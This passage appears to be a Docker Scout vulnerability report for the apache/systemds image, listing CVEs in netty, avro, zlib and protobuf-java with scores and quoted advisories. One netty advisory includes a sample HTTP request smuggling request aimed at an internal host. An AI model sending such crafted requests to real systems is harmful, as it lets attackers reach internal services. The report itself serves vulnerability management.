    i New version 1.19.0 available (installed version is 1.18.3) at https://github.com/docker/scout-cli
    ...Storing image for indexing
    ✓ Image stored for indexing
    ...Indexing
    ✓ Indexed 358 packages
    ✗ Detected 43 vulnerable packages with a total of 76 vulnerabilities
<h2>:mag: Vulnerabilities of <code>apache/systemds:latest</code></h2>

<details open="true"><summary>:package: Image Reference</strong> <code>apache/systemds:latest</code></summary>
<table>
<tr><td>digest</td><td><code>sha256:34aa623b2ccf8cf7a7ed8fa6b1ee890b036a5361e135123cbc9b0671ab6f5554</code></td><tr><tr><td>vulnerabilities</td><td><img alt="critical: 3" src="https://img.shields.io/badge/critical-3-8b1924"/> <img alt="high: 32" src="https://img.shields.io/badge/high-32-e25d68"/> <img alt="medium: 41" src="https://img.shields.io/badge/medium-41-fbb552"/> <img alt="low: 10" src="https://img.shields.io/badge/low-10-fce1a9"/> <img alt="unspecified: 1" src="https://img.shields.io/badge/unspecified-1-lightgrey"/></td></tr>
<tr><td>platform</td><td>linux/amd64</td></tr>
<tr><td>size</td><td>381 MB</td></tr>
<tr><td>packages</td><td>358</td></tr>
</table>
</details></table>
</details>

<table>
<tr><td valign="top">
<details><summary><img alt="critical: 1" src="https://img.shields.io/badge/C-1-8b1924"/> <img alt="high: 2" src="https://img.shields.io/badge/H-2-e25d68"/> <img alt="medium: 5" src="https://img.shields.io/badge/M-5-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>io.netty/netty</strong> <code>3.10.6.Final</code> (maven)</summary>

<small><code>pkg:maven/io.netty/netty@3.10.6.Final</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2019-20444?s=github&n=netty&ns=io.netty&t=maven&vr=%3C4.0.0"><img alt="critical 9.1: CVE--2019--20444" src="https://img.shields.io/badge/CVE--2019--20444-lightgrey?label=critical%209.1&labelColor=8b1924"/></a> <i>Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')</i>

<table>
<tr><td>Affected range</td><td><code><4.0.0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>9.1</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>11.096%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>93rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

HttpObjectDecoder.java in Netty before 4.1.44 allows an HTTP header that lacks a colon, which might be interpreted as a separate header with an incorrect syntax, or might be interpreted as an "invalid fold."

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2021-37137?s=github&n=netty&ns=io.netty&t=maven&vr=%3C4.0.0"><img alt="high 7.5: CVE--2021--37137" src="https://img.shields.io/badge/CVE--2021--37137-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Uncontrolled Resource Consumption</i>

<table>
<tr><td>Affected range</td><td><code><4.0.0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>2.383%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>85th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Impact
The Snappy frame decoder function doesn't restrict the chunk length which may lead to excessive memory usage. Beside this it also may buffer reserved skippable chunks until the whole chunk was received which may lead to excessive memory usage as well.

This vulnerability can be triggered by supplying malicious input that decompresses to a very big size (via a network stream or a file) or by sending a huge skippable chunk.

### Impact

All users of SnappyFrameDecoder are affected and so the application may be in risk for a DoS attach due excessive memory usage.

### References
https://github.com/netty/netty/blob/netty-4.1.67.Final/codec/src/main/java/io/netty/handler/codec/compression/SnappyFrameDecoder.java#L79
https://github.com/netty/netty/blob/netty-4.1.67.Final/codec/src/main/java/io/netty/handler/codec/compression/SnappyFrameDecoder.java#L171
https://github.com/netty/netty/blob/netty-4.1.67.Final/codec/src/main/java/io/netty/handler/codec/compression/SnappyFrameDecoder.java#L185

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2021-37136?s=github&n=netty&ns=io.netty&t=maven&vr=%3C4.0.0"><img alt="high 7.5: CVE--2021--37136" src="https://img.shields.io/badge/CVE--2021--37136-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Uncontrolled Resource Consumption</i>

<table>
<tr><td>Affected range</td><td><code><4.0.0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.021%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>77th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Impact
The Bzip2 decompression decoder function doesn't allow setting size restrictions on the decompressed output data (which affects the allocation size used during decompression).


All users of Bzip2Decoder are affected. The malicious input can trigger an OOME and so a DoS attack

### Workarounds
No workarounds other than not using the `Bzip2Decoder`

### References

Relevant code areas:

https://github.com/netty/netty/blob/netty-4.1.67.Final/codec/src/main/java/io/netty/handler/codec/compression/Bzip2Decoder.java#L80
https://github.com/netty/netty/blob/netty-4.1.67.Final/codec/src/main/java/io/netty/handler/codec/compression/Bzip2Decoder.java#L294
https://github.com/netty/netty/blob/netty-4.1.67.Final/codec/src/main/java/io/netty/handler/codec/compression/Bzip2Decoder.java#L305

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2021-43797?s=github&n=netty&ns=io.netty&t=maven&vr=%3C4.0.0"><img alt="medium 6.5: CVE--2021--43797" src="https://img.shields.io/badge/CVE--2021--43797-lightgrey?label=medium%206.5&labelColor=fbb552"/></a> <i>Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')</i>

<table>
<tr><td>Affected range</td><td><code><4.0.0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>6.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.325%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>55th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Impact

Netty currently just skips control chars when these are present at the beginning / end of the header name. We should better fail fast as these are not allowed by the spec and could lead to HTTP request smuggling.

Failing to do the validation might cause netty to "sanitize" header names before it forward these to another remote system when used as proxy. This remote system can't see the invalid usage anymore and so not do the validation itself.



</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2021-21290?s=github&n=netty&ns=io.netty&t=maven&vr=%3C4.0.0"><img alt="medium 6.2: CVE--2021--21290" src="https://img.shields.io/badge/CVE--2021--21290-lightgrey?label=medium%206.2&labelColor=fbb552"/></a> <i>Creation of Temporary File With Insecure Permissions</i>

<table>
<tr><td>Affected range</td><td><code><4.0.0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>6.2</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.026%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>7th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Impact

When netty's multipart decoders are used local information disclosure can occur via the local system temporary directory if temporary storing uploads on the disk is enabled.

The CVSSv3.1 score of this vulnerability is calculated to be a [6.2/10](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N&version=3.1)

### Vulnerability Details

On unix-like systems, the temporary directory is shared between all user. As such, writing to this directory using APIs that do not explicitly set the file/directory permissions can lead to information disclosure. Of note, this does not impact modern MacOS Operating Systems.

The method `File.createTempFile` on unix-like systems creates a random file, but, by default will create this file with the permissions `-rw-r--r--`. Thus, if sensitive information is written to this file, other local users can read this information.

This is the case in netty's `AbstractDiskHttpData` is vulnerable.

https://github.com/netty/netty/blob/e5951d46fc89db507ba7d2968d2ede26378f0b04/codec-http/src/main/java/io/netty/handler/codec/http/multipart/AbstractDiskHttpData.java#L80-L101

`AbstractDiskHttpData` is used as a part of the `DefaultHttpDataFactory` class which is used by `HttpPostRequestDecoder` / `HttpPostMultiPartRequestDecoder`.

You may be affected by this vulnerability your project contains the following code patterns:

```java
channelPipeline.addLast(new HttpPostRequestDecoder(...));
```

```java
channelPipeline.addLast(new HttpPostMultiPartRequestDecoder(...));
```

### Patches

This has been patched in version `4.1.59.Final`.

### Workarounds

Specify your own `java.io.tmpdir` when you start the JVM or use `DefaultHttpDataFactory.setBaseDir(...)` to set the directory to something that is only readable by the current user.

### References

 - [CWE-378: Creation of Temporary File With Insecure Permissions](https://cwe.mitre.org/data/definitions/378.html)
 - [CWE-379: Creation of Temporary File in Directory with Insecure Permissions](https://cwe.mitre.org/data/definitions/379.html)

### Similar Vulnerabilities

Similar, but not the same.

 - JUnit 4 - https://github.com/junit-team/junit4/security/advisories/GHSA-269g-pwp5-87pp
 - Google Guava - https://github.com/google/guava/issues/4011
 - Apache Ant - https://nvd.nist.gov/vuln/detail/CVE-2020-1945
 - JetBrains Kotlin Compiler - https://nvd.nist.gov/vuln/detail/CVE-2020-15824

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [netty](https://github.com/netty/netty)
* Email us [here](mailto:netty-security@googlegroups.com)

### Original Report

> Hi Netty Security Team,
> 
> I've been working on some security research leveraging custom CodeQL queries to detect local information disclosure vulnerabilities in java applications. This was the result from running this query against the netty project:
> https://lgtm.com/query/7723301787255288599/
> 
> Netty contains three local information disclosure vulnerabilities, so far as I can tell.
> 
> One is here, where the private key for the certificate is written to a temporary file.
> 
> https://github.com/netty/netty/blob/e5951d46fc89db507ba7d2968d2ede26378f0b04/handler/src/main/java/io/netty/handler/ssl/util/SelfSignedCertificate.java#L316-L346
> 
> One is here, where the certificate is written to a temporary file.
> 
> https://github.com/netty/netty/blob/e5951d46fc89db507ba7d2968d2ede26378f0b04/handler/src/main/java/io/netty/handler/ssl/util/SelfSignedCertificate.java#L348-L371
> 
> The final one is here, where the 'AbstractDiskHttpData' creates a temporary file if the getBaseDirectory() method returns null. I believe that 'AbstractDiskHttpData' is used as a part of the file upload support? If this is the case, any files uploaded would be similarly vulnerable.
> 
> https://github.com/netty/netty/blob/e5951d46fc89db507ba7d2968d2ede26378f0b04/codec-http/src/main/java/io/netty/handler/codec/http/multipart/AbstractDiskHttpData.java#L91
> 
> All of these vulnerabilities exist because `File.createTempFile(String, String)` will create a temporary file in the system temporary directory if the 'java.io.tmpdir' system property is not explicitly set. It is my understanding that when java creates a file, by default, and using this method, the permissions on that file utilize the umask. In a majority of cases, this means that the file that java creates has the permissions: `-rw-r--r--`, thus, any other local user on that system can read the contents of that file.
> 
> Impacted OS:
> - Any OS where the system temporary directory is shared between multiple users. This is not the case for MacOS or Windows.
> 
> Mitigation.
> 
> Moving to the `Files` API instead will fix this vulnerability. 
> https://docs.oracle.com/javase/8/docs/api/java/nio/file/Files.html#createTempFile-java.nio.file.Path-java.lang.String-java.lang.String-java.nio.file.attribute.FileAttribute...-
> 
> This API will explicitly set the posix file permissions to something safe, by default.
> 
> I recently disclosed a similar vulnerability in JUnit 4:
> https://github.com/junit-team/junit4/security/advisories/GHSA-269g-pwp5-87pp
> 
> If you're also curious, this vulnerability in Jetty was also mine, also involving temporary directories, but is not the same vulnerability as in this case.
> https://github.com/eclipse/jetty.project/security/advisories/GHSA-g3wg-6mcf-8jj6
> 
> I would appreciate it if we could perform disclosure of this vulnerability leveraging the GitHub security advisories feature here. GitHub has a nice credit system that I appreciate, plus the disclosures, as you can see from the sampling above, end up looking very nice.
> https://github.com/netty/netty/security/advisories
> 
> This vulnerability disclosure follows Google's [90-day vulnerability disclosure policy](https://www.google.com/about/appsecurity/) (I'm not an employee of Google, I just like their policy). Full disclosure will occur either at the end of the 90-day deadline or whenever a patch is made widely available, whichever occurs first.
> 
> Cheers,
> Jonathan Leitschuh

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2021-21409?s=github&n=netty&ns=io.netty&t=maven&vr=%3C4.0.0"><img alt="medium 5.9: CVE--2021--21409" src="https://img.shields.io/badge/CVE--2021--21409-lightgrey?label=medium%205.9&labelColor=fbb552"/></a> <i>Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')</i>

<table>
<tr><td>Affected range</td><td><code><4.0.0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>5.9</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>2.547%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>85th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Impact
The content-length header is not correctly validated if the request only use a single Http2HeaderFrame with the endStream set to to true. This could lead to request smuggling if the request is proxied to a remote peer and translated to HTTP/1.1

This is a followup of https://github.com/netty/netty/security/advisories/GHSA-wm47-8v5p-wjpj which did miss to fix this one case. 

### Patches
This was fixed as part of 4.1.61.Final

### Workarounds
Validation can be done by the user before proxy the request by validating the header.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2021-21295?s=github&n=netty&ns=io.netty&t=maven&vr=%3C4.0.0"><img alt="medium 5.9: CVE--2021--21295" src="https://img.shields.io/badge/CVE--2021--21295-lightgrey?label=medium%205.9&labelColor=fbb552"/></a> <i>Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')</i>

<table>
<tr><td>Affected range</td><td><code><4.0.0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>5.9</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.360%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>58th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Impact
If a Content-Length header is present in the original HTTP/2 request, the field is not validated by `Http2MultiplexHandler` as it is propagated up.  This is fine as long as the request is not proxied through as HTTP/1.1.
If the request comes in as an HTTP/2 stream, gets converted into the HTTP/1.1 domain objects (`HttpRequest`, `HttpContent`, etc.) via `Http2StreamFrameToHttpObjectCodec `and then sent up to the child channel's pipeline and proxied through a remote peer as HTTP/1.1 this may result in request smuggling.  

In a proxy case, users  may assume the content-length is validated somehow, which is not the case.  If the request is forwarded to a backend channel that is a HTTP/1.1 connection, the Content-Length now has meaning and needs to be checked.

An attacker can smuggle requests inside the body as it gets downgraded from HTTP/2 to HTTP/1.1.   A sample attack request looks like:

```
POST / HTTP/2
:authority:: externaldomain.com
Content-Length: 4

asdfGET /evilRedirect HTTP/1.1
Host: internaldomain.com
```

Users are only affected if all of this is `true`:
 * `HTTP2MultiplexCodec` or `Http2FrameCodec` is used
 * `Http2StreamFrameToHttpObjectCodec` is used to convert to HTTP/1.1 objects
 * These  HTTP/1.1 objects are forwarded to another remote peer.
 

### Patches
This has been patched in 4.1.60.Final

### Workarounds
The user can do the validation by themselves by implementing a custom `ChannelInboundHandler` that is put in the `ChannelPipeline` behind `Http2StreamFrameToHttpObjectCodec`.

### References
Related change to workaround the problem: https://github.com/Netflix/zuul/pull/980 

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2019-20445?s=github&n=netty&ns=io.netty&t=maven&vr=%3C4.0.0"><img alt="medium : CVE--2019--20445" src="https://img.shields.io/badge/CVE--2019--20445-lightgrey?label=medium%20&labelColor=fbb552"/></a> <i>Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')</i>

<table>
<tr><td>Affected range</td><td><code><4.0.0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>2.837%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>86th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

HttpObjectDecoder.java in Netty before 4.1.44 allows a Content-Length header to be accompanied by a second Content-Length header, or by a Transfer-Encoding header.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 1" src="https://img.shields.io/badge/C-1-8b1924"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>org.apache.avro/avro</strong> <code>1.11.2</code> (maven)</summary>

<small><code>pkg:maven/org.apache.avro/avro@1.11.2</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-47561?s=github&n=avro&ns=org.apache.avro&t=maven&vr=%3C1.11.4"><img alt="critical 9.3: CVE--2024--47561" src="https://img.shields.io/badge/CVE--2024--47561-lightgrey?label=critical%209.3&labelColor=8b1924"/></a> <i>Deserialization of Untrusted Data</i>

<table>
<tr><td>Affected range</td><td><code><1.11.4</code></td></tr>
<tr><td>Fixed version</td><td><code>1.11.4</code></td></tr>
<tr><td>CVSS Score</td><td><code>9.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.543%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>67th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Schema parsing in the Java SDK of Apache Avro 1.11.3 and previous versions allows bad actors to execute arbitrary code.
Users are recommended to upgrade to version 1.11.4 or 1.12.0, which fix this issue.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-39410?s=github&n=avro&ns=org.apache.avro&t=maven&vr=%3C1.11.3"><img alt="high 7.5: CVE--2023--39410" src="https://img.shields.io/badge/CVE--2023--39410-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Improper Input Validation</i>

<table>
<tr><td>Affected range</td><td><code><1.11.3</code></td></tr>
<tr><td>Fixed version</td><td><code>1.11.3</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.061%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>19th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When deserializing untrusted or corrupted data, it is possible for a reader to consume memory beyond the allowed constraints and thus lead to out of memory on the system.

This issue affects Java applications using Apache Avro Java SDK up to and including 1.11.2.  Users should update to apache-avro version 1.11.3 which addresses this issue.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 1" src="https://img.shields.io/badge/C-1-8b1924"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>zlib</strong> <code>1.3.1-r1</code> (apk)</summary>

<small><code>pkg:apk/alpine/zlib@1.3.1-r1?os_name=alpine&os_version=3.20</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-22184?s=alpine&n=zlib&ns=alpine&t=apk&osn=alpine&osv=3.20&vr=%3C%3D1.3.1-r1"><img alt="critical : CVE--2026--22184" src="https://img.shields.io/badge/CVE--2026--22184-lightgrey?label=critical%20&labelColor=8b1924"/></a> 

<table>
<tr><td>Affected range</td><td><code><=1.3.1-r1</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.081%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>24th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>



</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 4" src="https://img.shields.io/badge/H-4-e25d68"/> <img alt="medium: 2" src="https://img.shields.io/badge/M-2-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>com.google.protobuf/protobuf-java</strong> <code>3.7.1</code> (maven)</summary>

<small><code>pkg:maven/com.google.protobuf/protobuf-java@3.7.1</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-7254?s=github&n=protobuf-java&ns=com.google.protobuf&t=maven&vr=%3C3.25.5"><img alt="high 8.7: CVE--2024--7254" src="https://img.shields.io/badge/CVE--2024--7254-lightgrey?label=high%208.7&labelColor=e25d68"/></a> <i>Improper Input Validation</i>

<table>
<tr><td>Affected range</td><td><code><3.25.5</code></td></tr>
<tr><td>Fixed version</td><td><code>3.25.5</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.7</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.085%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>25th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary
When parsing unknown fields in the Protobuf Java Lite and Full library, a maliciously crafted message can cause a StackOverflow error and lead to a program crash.

Reporter: Alexis Challande, Trail of Bits Ecosystem Security Team <ecosystem@trailofbits.com>

Affected versions: This issue affects all versions of both the Java full and lite Protobuf runtimes, as well as Protobuf for Kotlin and JRuby, which themselves use the Java Protobuf runtime.

### Severity
[CVE-2024-7254](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-7254) **High** CVSS4.0 Score 8.7 (NOTE: there may be a delay in publication)
This is a potential Denial of Service. Parsing nested groups as unknown fields with DiscardUnknownFieldsParser or Java Protobuf Lite parser, or against Protobuf map fields, creates unbounded recursions that can be abused by an attacker.

### Proof of Concept
For reproduction details, please refer to the unit tests (Protobuf Java [LiteTest](https://github.com/protocolbuffers/protobuf/blob/a037f28ff81ee45ebe008c64ab632bf5372242ce/java/lite/src/test/java/com/google/protobuf/LiteTest.java) and [CodedInputStreamTest](https://github.com/protocolbuffers/protobuf/blob/a037f28ff81ee45ebe008c64ab632bf5372242ce/java/core/src/test/java/com/google/protobuf/CodedInputStreamTest.java)) that identify the specific inputs that exercise this parsing weakness.

### Remediation and Mitigation
We have been working diligently to address this issue and have released a mitigation that is available now. Please update to the latest available versions of the following packages:
* protobuf-java (3.25.5, 4.27.5, 4.28.2)
* protobuf-javalite (3.25.5, 4.27.5, 4.28.2)
* protobuf-kotlin (3.25.5, 4.27.5, 4.28.2)
* protobuf-kotlin-lite (3.25.5, 4.27.5, 4.28.2)
* com-protobuf [JRuby gem only] (3.25.5, 4.27.5, 4.28.2)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2022-3510?s=github&n=protobuf-java&ns=com.google.protobuf&t=maven&vr=%3E%3D3.0.0%2C%3C3.16.3"><img alt="high 7.5: CVE--2022--3510" src="https://img.shields.io/badge/CVE--2022--3510-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Uncontrolled Resource Consumption</i>

<table>
<tr><td>Affected range</td><td><code>>=3.0.0<br/><3.16.3</code></td></tr>
<tr><td>Fixed version</td><td><code>3.16.3</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.073%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>22nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A parsing issue similar to CVE-2022-3171, but with Message-Type Extensions in protobuf-java core and lite versions prior to 3.21.7, 3.20.3, 3.19.6 and 3.16.3 can lead to a denial of service attack. Inputs containing multiple instances of non-repeated embedded messages with repeated or unknown fields causes objects to be converted back-n-forth between mutable and immutable forms, resulting in potentially long garbage collection pauses. We recommend updating to the versions mentioned above.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2022-3509?s=github&n=protobuf-java&ns=com.google.protobuf&t=maven&vr=%3E%3D3.0.0%2C%3C3.16.3"><img alt="high 7.5: CVE--2022--3509" src="https://img.shields.io/badge/CVE--2022--3509-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Uncontrolled Resource Consumption</i>

<table>
<tr><td>Affected range</td><td><code>>=3.0.0<br/><3.16.3</code></td></tr>
<tr><td>Fixed version</td><td><code>3.16.3</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.131%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>33rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A parsing issue similar to CVE-2022-3171, but with textformat in protobuf-java core and lite versions prior to 3.21.7, 3.20.3, 3.19.6 and 3.16.3 can lead to a denial of service attack. Inputs containing multiple instances of non-repeated embedded messages with repeated or unknown fields causes objects to be converted back-n-forth between mutable and immutable forms, resulting in potentially long garbage collection pauses. We recommend updating to the versions mentioned above.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2021-22569?s=github&n=protobuf-java&ns=com.google.protobuf&t=maven&vr=%3C3.16.1"><img alt="high 7.5: CVE--2021--22569" src="https://img.shields.io/badge/CVE--2021--22569-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Incorrect Behavior Order</i>

<table>
<tr><td>Affected range</td><td><code><3.16.1</code></td></tr>
<tr><td>Fixed version</td><td><code>3.16.1</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.291%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>52nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

## Summary

A potential Denial of Service issue in protobuf-java was discovered in the parsing procedure for binary data.

Reporter: [OSS-Fuzz](https://github.com/google/oss-fuzz)

Affected versions: All versions of Java Protobufs (including Kotlin and JRuby) prior to the versions listed below. Protobuf "javalite" users (typically Android) are not affected.

## Severity

[CVE-2021-22569](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22569) **High** - CVSS Score: 7.5,  An implementation weakness in how unknown fields are parsed in Java. A small (~800 KB) malicious payload can occupy the parser for several minutes by creating large numbers of short-lived objects that cause frequent, repeated GC pauses.

## Proof of Concept

For reproduction details, please refer to the oss-fuzz issue that identifies the specific inputs that exercise this parsing weakness.

## Remediation and Mitigation

Please update to the latest available versions of the following packages:

- protobuf-java (3.16.1, 3.18.2, 3.19.2) 
- protobuf-kotlin (3.18.2, 3.19.2)
- google-protobuf [JRuby  gem only] (3.19.2) 


</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2022-3171?s=github&n=protobuf-java&ns=com.google.protobuf&t=maven&vr=%3C3.16.3"><img alt="medium 5.7: CVE--2022--3171" src="https://img.shields.io/badge/CVE--2022--3171-lightgrey?label=medium%205.7&labelColor=fbb552"/></a> <i>Improper Input Validation</i>

<table>
<tr><td>Affected range</td><td><code><3.16.3</code></td></tr>
<tr><td>Fixed version</td><td><code>3.16.3</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.7</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.078%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>24th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

## Summary
A potential Denial of Service issue in `protobuf-java` core and lite was discovered in the parsing procedure for binary and text format data. Input streams containing multiple instances of non-repeated [embedded messages](http://developers.google.com/protocol-buffers/docs/encoding#embedded) with repeated or unknown fields causes objects to be converted back-n-forth between mutable and immutable forms, resulting in potentially long garbage collection pauses. 

Reporter: [OSS Fuzz](https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=48771)

Affected versions: This issue affects both the Java full and lite Protobuf runtimes, as well as Protobuf for Kotlin and JRuby, which themselves use the Java Protobuf runtime.

## Severity

[CVE-2022-3171](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3171) Medium - CVSS Score: 5.7 (NOTE: there may be a delay in publication)

## Remediation and Mitigation

Please update to the latest available versions of the following packages:

protobuf-java (3.21.7, 3.20.3, 3.19.6, 3.16.3)
